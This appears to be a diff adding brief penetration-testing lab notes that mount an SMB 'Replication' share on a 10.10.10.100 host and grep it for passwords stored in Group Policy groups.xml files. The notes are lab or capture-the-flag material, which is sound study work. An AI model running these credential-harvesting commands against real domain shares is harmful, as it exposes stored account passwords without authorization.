@@ -1,0 +1,11 @@
+
+
+Install cifs-utils:
+sudo apt-get install cifs-utils
+
+
+Use cifs-utils and mount to get password from groups.xml:
+mkdir /mnt/Replication
+mount -t cifs //10.10.10.100/Replication /mnt/Replication -o username=<username>,password=<password>,domain=<domain>
+grep -R password /mnt/Replication
+
